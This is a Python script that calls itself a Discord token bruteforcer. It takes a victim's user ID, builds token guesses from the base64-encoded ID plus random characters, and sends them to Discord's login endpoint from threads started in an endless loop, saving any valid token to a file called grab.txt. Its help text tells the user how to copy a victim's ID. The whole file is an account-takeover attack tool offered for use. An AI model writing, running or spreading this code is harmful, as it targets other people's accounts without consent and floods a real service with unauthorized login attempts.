import threading
import random
import requests
import base64
import string
import os
from colorama import Fore
import time

# Eyecandy effects :)
print("""
  ___________           .__                   
 /   _____/  | _____.__.|  |__ _____  ___  ___
 \_____  \|  |/ <   |  ||  |  \\__  \ \  \/  /
 /        \    < \___  ||   Y  \/ __ \_>    < 
/_______  /__|_ \/ ____||___|  (____  /__/\_ \

""")

print(Fore.CYAN + 'Presents...')
time.sleep(2)

print(Fore.YELLOW + 'Discord Token Bruteforcer - Made by 1mp0ss1bl3#1691 (Discord)')

time.sleep(1)

# 786739506618826753

menu = input(f'{Fore.RED} Available commands: start/exit/help: ')
if menu == 'exit':
    print("Bye!")
elif menu == 'help':
    menu = input(f'{Fore.GREEN} What do you need help with? (ID, Info, Contact, Exit) ')
    if menu == 'ID':
        print()
        print("""To find the ID of the user you want to brute force, follow these instructions and restart the script:
        1. Enable developer mode in Discord settings.
        2. Go back to the main menu and click on the victim's profile.
        3. Click on the three dots on the upper right corner and select "Copy ID".
        4. Restart this script, select start, and paste the ID here.""")
    elif menu == 'Info':
        print()
        print("""The chances of generating a correct token are extremely low, so it is highly recommended to make a copy of this python file and run it on your own computer for faster results. The faster your computer is, the more tokens it will generate per second, increasing the chances of getting the correct token. If a correct token is generated, this script will create a file named "grab.txt" and put the correct token in it.""")
    elif menu == 'Contact':
        print()
        print("Contact 1mp0ss1bl3#6596 on Discord for more help")
    elif menu == 'exit':
        print("Bye!")
elif menu == 'start':
    id_to_token = base64.b64encode(input("Input the ID of the user you want to Bruteforce (If you don't know how, select help from the main menu): ").encode("ascii")).decode("ascii")
    # This part uses Base64 to encode the ID to the first string of the token

    def bruteforce():
        while True:
            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
            # This part creates a token by combining the encoded ID with randomly generated strings

            headers = {'Authorization': token}
            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
            try:
                if login.status_code == 200:
                    print('[+] VALID', token)
                    with open('grab.txt', "a+") as f:
                        f.write(f'{token}\n')
                else:
                    print('[-] INVALID', token)
            except Exception as e:
                print('[-] An error occurred:', str(e))
            finally:
                print('')

    def thread():
        while True:
            threading.Thread(target=bruteforce).start()

    thread()
